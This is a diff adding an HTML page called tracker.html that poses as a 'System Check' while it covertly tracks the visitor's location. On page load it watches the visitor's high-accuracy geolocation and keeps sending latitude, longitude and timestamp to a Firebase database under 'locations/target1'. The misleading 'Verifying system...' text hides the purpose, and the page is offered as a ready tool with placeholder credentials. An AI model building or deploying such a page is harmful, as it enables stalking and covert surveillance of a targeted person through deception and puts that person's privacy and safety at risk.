@@ -1,0 +1,56 @@
+<!-- tracker.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>System Verification</title>
+  <style>
+    body { font-family: Arial; background: #f2f2f2; text-align: center; padding: 50px; }
+    #msg { font-size: 18px; color: #555; }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  <script>
+    // TODO: Replace this with your own Firebase config
+    var firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "SENDER_ID",
+      appId: "APP_ID"
+    };
+    firebase.initializeApp(firebaseConfig);
+    var db = firebase.database();
+
+    function sendLocation(lat, lon) {
+      db.ref('locations/target1').set({
+        latitude: lat,
+        longitude: lon,
+        timestamp: new Date().toISOString()
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(function(position) {
+          sendLocation(position.coords.latitude, position.coords.longitude);
+        }, function(error) {
+          document.getElementById('msg').innerText = 'Location access denied.';
+        }, { enableHighAccuracy: true });
+      } else {
+        document.getElementById('msg').innerText = 'Geolocation not supported.';
+      }
+    }
+
+    window.onload = function() {
+      document.getElementById('msg').innerText = 'Verifying system...';
+      getLocation();
+    }
+  </script>
+</head>
+<body>
+  <h2>System Check In Progress...</h2>
+  <p id="msg">Please wait while we verify your system.</p>
+</body>
+</html>
